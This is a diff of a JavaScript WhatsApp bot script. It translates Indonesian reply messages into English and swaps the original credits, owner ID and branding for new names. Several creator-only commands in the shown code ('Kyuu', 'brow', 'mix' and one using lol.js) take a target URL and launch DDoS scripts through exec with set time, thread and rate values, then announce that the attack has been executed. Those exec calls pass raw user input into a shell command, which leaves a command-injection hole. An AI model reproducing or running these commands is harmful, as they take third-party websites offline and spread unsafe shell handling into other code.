@@ -731,7 +731,7 @@ break
 case 'Kyuu': {
 if (!isCreator) return
 if (!text) return newReply(`*Example*: ${prefix + command} [url]`)
-newReply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`);
+newReply(`A DDoS attack has been executed against the targeted Website:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nThank you for your patience.\n`);
 exec(`node ./lib/DDoS/kyuu.js ${text} 60 20 100`, (err, stdout) => {
 if (err) return console.log(err.toString())
 if (stdout) return console.log(util.format(stdout))
@@ -771,7 +771,7 @@ case 'toimage':
 case 'Kyuu': {
 if (!isCreator) return
 if (!text) return newReply(`*Example*: ${prefix + command} [url]`)
-newReply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`);
+newReply(`A DDoS attack has been executed against the targeted Website:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nThank you for your patience.\n`);
 exec(`node ./lib/DDoS/kyuu.js ${text} 60 20 100`, (err, stdout) => {
 if (err) return console.log(err.toString())
 if (stdout) return console.log(util.format(stdout))
@@ -2508,19 +2508,14 @@ break
         
 case "tqto":{
   me = m.sender;
-  creditos = `Hallo Sis, here are the names who have been registered in creating/helping in the development of this script
+  creditos = `Hello here are the names who have been registered in creating/helping in the development of this script
 
 *BIG TAHNKS TO*
 
-> Siputzx [ penyedia Base ]
-> KyuuRzy
-> GhostXdzz
-> Hyuu Offc
-> TheZetsuboXygen
-> Juna
-> Adrian
-
-ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴋʏᴜᴜʀᴢʏ`
+> mr wasi 
+> Haroon king 
+> and all wasi tech team
+𝒸𝓇𝑒𝒶𝓉𝑒𝒹 𝒷𝓎 𝓌𝒶𝓈𝒾`
 ptz.sendMessage(m?.chat, { 
 text: creditos, 
 contextInfo: { 
@@ -2528,15 +2523,15 @@ forwardingScore: 10,
 isForwarded: true, 
 mentionedJid: [m?.sender],
 businessMessageForwardInfo: { 
-businessOwnerJid: '6281351692548@s.whatsapp.net'
+businessOwnerJid: '923192173398@s.whatsapp.net'
 },
 forwardedNewsletterMessageInfo: {
-newsletterJid: '120363196693847188@newsletter',
+newsletterJid: '1203631966938@newsletter',
 serverMessageId: 103,
 newsletterName: "Special Thanks To "
 },
 externalAdReply: { 
-title: `Kyuu`, 
+title: `wasoo`, 
 thumbnail: menunya, 
 }}})
 }
@@ -2545,7 +2540,7 @@ break;
 case 'brow': {
 if (!isCreator) return
 if (!text) return newReply(`*Example*: ${prefix + command} [url]`)
-newReply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`);
+newReply(`A DDoS attack has been executed against the targeted Website:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nThank you for your patience.\n`);
 exec(`node ./lib/DDoS/brow.js ${text} 60 20 100`, (err, stdout) => {
 if (err) return console.log(err.toString())
 if (stdout) return console.log(util.format(stdout))
@@ -2556,7 +2551,7 @@ break
 case 'mix': {
 if (!isCreator) return
 if (!text) return newReply(`*Example*: ${prefix + command} [url]`)
-newReply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`);
+newReply(`A DDoS attack has been executed against the targeted Website:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nThank you for your patience.\n`);
 exec(`node ./lib/DDoS/mix.js ${text} 60 20 100`, (err, stdout) => {
 if (err) return console.log(err.toString())
 if (stdout) return console.log(util.format(stdout))
@@ -2570,7 +2565,7 @@ if (!text) return newReply(`*Example*: ${prefix + command} [url]`)
 let ddosin = require("./lib/lol.js")
 ddosin(`${text}`)
 if (args.length === 1 && text) {
-newReply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`)
+newReply(`A DDoS attack has been executed against the targeted Website:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nThank you for your patience.\n`)
 exec(`node ./lib/lol.js`, (err, stdout) => {
 if (err) return console.log(err.toString())
 if (stdout) return console.log(util.format(stdout))
